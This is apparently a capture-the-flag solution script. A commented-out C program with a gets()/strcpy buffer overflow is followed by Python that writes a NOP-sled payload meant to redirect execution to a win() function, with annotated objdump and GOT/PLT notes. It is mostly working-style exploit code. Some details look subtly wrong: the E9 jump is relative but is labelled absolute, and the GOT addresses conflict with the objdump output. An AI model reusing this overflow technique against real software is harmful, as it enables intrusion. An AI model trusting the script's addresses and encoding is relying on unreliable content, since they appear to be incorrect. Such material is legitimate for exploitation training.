##include<stdlib.h>
#void
#win(){
#    printf("YOU WIN!\n");
#}

#int main(int argc, char*argv[]){
#    void * buf01 = malloc(1024);
#    char buf02[384];
#
#    gets(buf02);
#    strcpy(buf01,buf02);
#
#    exit(-1);
#}

import struct

with open('./06-challenge.win','wb') as win:
	# $ objdump -d -Mintel 06-challenge | grep -A 10 win
	# 080484d8 <win>:
	#  80484d8:       55                      push   ebp
	#  80484d9:       89 e5                   mov    ebp,esp
	#  80484db:       68 04 86 04 08          push   0x8048604
	#  80484e0:       e8 db fe ff ff          call   80483c0 <puts@plt>#####>>
	#  80484e5:       83 c4 04                add    esp,0x4				##
	#  80484e8:       c9                      leave							##
	#  80484e9:       c3                      ret							##
																			##
	# call   80483c0 <puts@plt>	<<##########################################<<
	   ##
	   ##
	# Disassembly of section .plt:
	# 080483c0 <puts@plt>:
 	# 80483c0:       ff 25 0c a0 04 08       jmp    DWORD PTR ds:0x804a00c
 	# 80483c6:       68 18 00 00 00          push   0x18
 	# 80483cb:       e9 b0 ff ff ff          jmp    8048380 <.plt>	>>##########################>>
																								##
																								##
	# $ objdump -s 06-challenge | grep -A 10 got.plt											##
	# Contents of section .got.plt:																##
	# 8049ff4 209f0408 00000000 00000000 96830408	--| LITTLE |--> 8049ff4 08049f20 00000000 00000000 08048396
	# 804a004 a6830408 b6830408 c6830408 d6830408	--| ENDIAN |--> 804a004 080483a6 080483b6 080483c6 080483d6 	
																								##
																								##
	#| .got		| func  	| .ptl 		|														##
	#|----------|-----------|-----------|														##
	#| 080496c8 | puts()    | 80483c6 	| <<####################################################<<

	buf  = b"\x90" * 100
	shellcode = b"\xE9\xD4\x84\x04\x08" #jmp 0x080484d8
	win.write(buf + shellcode + b"\x90" * (384 - len(buf) - len(shellcode)))
